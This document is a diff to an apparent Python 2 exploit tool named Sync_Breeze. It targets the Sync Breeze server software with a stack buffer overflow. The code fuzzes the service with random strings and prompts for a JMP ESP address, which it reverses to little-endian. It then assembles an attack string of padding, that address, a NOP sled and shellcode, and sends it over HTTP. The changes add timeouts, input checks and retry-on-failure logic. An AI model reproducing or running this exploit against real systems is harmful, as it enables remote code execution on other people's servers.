@@ -96,13 +96,21 @@ class Sync_Breeze():
                                  sys.stdout.write('\x1b[2K') 
                                                          
                         except:
-                             print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(Fuzzer)+W+ R+ " Characters"+W 
+                             if  Fuzzer > 100:                           
+                                 print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(Fuzzer)+W+ R+ " Characters"+W 
+                             else:
+                               print Y+"\n[+]"+W+R+"String Pattern NOT Generated :"+W 
+                               time.sleep(1)
+                               print Y+"\n[+]"+W+B+"service is down "+W 
+                               time.sleep(1)
+                               print  Banner
+                               exit()  
                     except KeyboardInterrupt:
                         print  Banner
                         exit() 
 
                     try:
-                        input= raw_input(O+"\n[]>>>>>>"+W+R+"Please Restart the Application then Press any key to Continue"+W+O+"<<<<<<<[]"+W)
+                        input= raw_input(O+"\n[]>>>>>>"+W+R+"Please Restart the Application then Press Enter to Continue"+W+O+"<<<<<<<[]"+W)
                     except NameError:
                            pass	                                                        
                     self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(int(Fuzzer))).lower()  
@@ -144,7 +152,7 @@ class Sync_Breeze():
      def connect_servser(self):
         try:
             session = requests.session()
-            response = session.get(self.target_url)
+            response = session.get(self.target_url,timeout=5)
             if response.ok == True:
      	       while True:
                     try:
@@ -165,7 +173,12 @@ class Sync_Breeze():
             else:
                 print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W 
                 print Y+"\n[+]"+W+w+"please Restart The Service and try agin"+W+Y+"...!!!"+W  	   
-                self.connect_servser()    
+                self.connect_servser()
+        except requests.exceptions.ReadTimeout:
+                print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W 
+                print Y+"\n[+]"+W+P+"please Restart The Service and try agin"+W+Y+"...!!!"+W 
+                self.Fuzzing__()
+                self.connect_servser()
         except KeyboardInterrupt:
             print  Banner
             exit()
@@ -221,6 +234,11 @@ class Sync_Breeze():
          
                try:
                     jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
+                    if len(jump) < 4 :
+                        print Y+"\n[(*)]"+W+R+"JMP ESP is Required "+W+Y+"[(*)] "+W  
+	                return self.little_endian()  
+	            else:
+	               pass                         
                     time.sleep(2)
                     self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                     self.display =self.jump_address# for print olnly
@@ -243,16 +261,17 @@ class Sync_Breeze():
                    self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address)
                    self.NO_Operation =self.NO_Operation*"\x90"
                    self.count = self.NO_Operation.count("\x90")    
-                   attack = Start_string+self.jump_address+ self.NO_Operation +shell_code 
+                   attack = Start_string+self.jump_address+ self.NO_Operation + str(shell_code) 
                    time.sleep(2)
                    print Y+'\n[+]'+W+B+' attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ " A "+W+O+' + '+W+B+\
                    ' JMP ESP ='+W,Y+ self.display+W ,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O +'+'+W+P+' shell_code'+W
                    time.sleep(2)
                    print Y+"\n[+]"+W+R+"Target URL "+W+O+ " : "+W, P+self.target_url+W
                    time.sleep(2)
-                   session = requests.session()
-                   response = session.get(self.target_url)
-                   if response.ok == True:
+                   try:
+                      session = requests.session()
+                      response = session.get(self.target_url,timeout=5)
+                      if response.ok == True:                  
                          try:
                             while True:
                               session = requests.session()
@@ -268,10 +287,10 @@ class Sync_Breeze():
                              print B +"\n[+]"+W+R+"WE READY TO ATTACK !!"+W+B+"[+]"+W 
                              time.sleep(2)
                              print Y+"\n[+]"+W+R+"________________Expolit Done _______________ "+W+B+"***!!!"+W 
-                            
-                   else:                 
-                       print O+"\n[(!)]"+W+Y+"Connection is Down >> requests.exceptions.ConnectionError"+W
-                       print  Banner          
+                   except Exception : 
+                       print O+"\n[(!)]"+W+Y+"Connection is Down >> requests.exceptions.ConnectionError"+W 
+                       self.little_endian()
+                       self.attack_all()               
                except KeyboardInterrupt:
                    print  Banner
                    exit()  
@@ -323,3 +342,5 @@ class Sync_Breeze():
 		          
 if __name__ == '__main__':
    Sync_Breeze()
+
+
